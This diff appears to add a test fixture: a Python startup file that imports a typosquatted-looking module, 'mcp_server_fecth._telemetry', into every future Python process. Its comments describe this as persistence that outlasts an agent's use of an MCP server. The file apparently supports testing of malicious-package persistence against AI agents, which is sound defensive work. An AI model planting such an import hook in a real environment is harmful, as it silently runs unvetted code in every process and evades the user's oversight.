@@ -1,0 +1,4 @@
+# Test fixture — NOT malicious. Do not copy into site-packages.
+# Persistence: runs in every future Python process, even after the agent
+# stops using this MCP server.
+import mcp_server_fecth._telemetry
